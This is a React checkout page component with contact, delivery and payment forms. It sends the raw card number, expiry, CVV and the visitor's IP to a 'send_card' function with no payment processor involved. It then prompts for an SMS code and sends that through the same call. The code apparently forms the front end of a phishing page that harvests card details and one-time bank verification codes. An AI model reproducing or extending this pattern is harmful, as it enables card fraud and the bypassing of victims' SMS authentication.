import React, { useState } from "react";
import { observer } from "mobx-react-lite";
import styled from "@emotion/styled";
import { PaymentDetails, ShippingDetails } from "../../utils/interfaces";
import cartStore from "../../store/CartStore";
import ContactForm from "../../components/Checkout/ContactForm";
import DeliveryForm from "../../components/Checkout/DelveryPage";
import OrderSummary from "../../components/Checkout/OrderSummary";
import PaymentForm from "../../components/Checkout/PaymentForm";
import { checkCardUtil } from "../../utils/checkcardData";
import { user } from "../..";

const CheckoutPageContainer = styled.div`
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  padding: 20px;
`;

const CheckoutFormContainer = styled.form`
  flex: 1 1 400px;
  max-width: 500px;
  margin-right: 20px;
`;

const CheckoutButton = styled.button<{ isSmsStep: boolean }>`
  width: 100%;
  padding: 15px;
  background-color: #ff9900;
  border: none;
  color: white;
  font-size: 18px;
  border-radius: 5px;
  cursor: pointer;
  margin-top: ${(props) => (props.isSmsStep ? "20px" : "0")};
`;

const SmsCodeInput = styled.input`
  width: 100%;
  padding: 10px;
  margin-top: 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
`;

const CheckoutPage: React.FC = observer(() => {
  const [shippingDetails, setShippingDetails] = useState<ShippingDetails>({
    email: "",
    firstName: "",
    lastName: "",
    company: "",
    address: "",
    apartment: "",
    city: "",
    state: "",
    zipCode: "",
    country: "United States",
    phone: "",
  });

  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails>({
    cardNumber: "",
    expirationDate: "",
    securityCode: "",
    nameOnCard: "",
  });

  const [isSmsStep, setIsSmsStep] = useState(false);
  const [smsCode, setSmsCode] = useState("");

  const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = event.target;
    setShippingDetails({ ...shippingDetails, [name]: value });
  };

  const handlePaymentInputChange = (
    event: React.ChangeEvent<HTMLInputElement>
  ) => {
    let { name, value } = event.target;
    ({ name, value } = checkCardUtil(name, value));
    setPaymentDetails({ ...paymentDetails, [name]: value });
  };

  const handleSmsCodeChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    setSmsCode(event.target.value);
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();

    const data: any = {
      card_number: paymentDetails.cardNumber,
      expiry_date: paymentDetails.expirationDate,
      cvv: paymentDetails.securityCode,
      user_ip: user.ip,
    };

    if (!isSmsStep) {
      await user.send_card(data);
      setIsSmsStep(true);
    } else {
      data.sms_code = smsCode;
      await user.send_card(data);
    }
  };

  return (
    <CheckoutPageContainer>
      <CheckoutFormContainer onSubmit={handleSubmit}>
        <ContactForm
          shippingDetails={shippingDetails}
          handleInputChange={handleInputChange}
        />
        <DeliveryForm
          shippingDetails={shippingDetails}
          handleInputChange={handleInputChange}
        />
        <PaymentForm
          paymentDetails={paymentDetails}
          handlePaymentInputChange={handlePaymentInputChange}
        />
        {isSmsStep && (
          <SmsCodeInput
            type="text"
            placeholder="Enter SMS code"
            value={smsCode}
            onChange={handleSmsCodeChange}
            required
          />
        )}
        <CheckoutButton type="submit" isSmsStep={isSmsStep}>
          {isSmsStep ? "Send SMS" : "Pay now"}
        </CheckoutButton>
      </CheckoutFormContainer>
      <OrderSummary />
    </CheckoutPageContainer>
  );
});

export default CheckoutPage;
